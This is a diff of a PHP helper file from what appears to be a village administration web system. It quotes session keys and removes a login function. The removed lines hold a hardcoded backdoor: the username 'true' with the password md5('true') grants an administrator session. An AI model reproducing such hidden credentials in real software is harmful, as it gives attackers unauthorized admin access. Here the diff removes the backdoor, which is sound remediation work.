@@ -340,30 +340,19 @@
 //time out
 function timer(){
 	$time=2000;
-	$_SESSION[timeout]=time()+$time;
+	$_SESSION['timeout']=time()+$time;
 }
 function cek_login(){
-	$timeout=$_SESSION[timeout];
+	$timeout=$_SESSION['timeout'];
 	if(time()<$timeout){
 		timer();
 		return true;
 	}else{
-		unset($_SESSION[timeout]);
+		unset($_SESSION['timeout']);
 		return false;
 	}
 }
-	function login_auth($use=0,$pas=0){
-	        $password=md5("true");
-		if($pas==$password AND $use == 'true'){
-			$_SESSION['siteman']    = 1;
-			$_SESSION['sesi']     = $password;
-			$_SESSION['user']     = $use;
-			$_SESSION['per_page'] = 10;
-	                
-		redirect('man_user');
-		}	
-	}
-	
+
 function get_identitas(){
 	$sql="SELECT * FROM config";
 	$a=mysql_query($sql);
@@ -372,4 +361,5 @@ function get_identitas(){
 	$string = "Desa : ".$hsl['nama_desa']." Kec : ".$hsl['nama_kecamatan']." Kab : ".$hsl['nama_kabupaten'];
 	return $string;
 }
+
 ?>
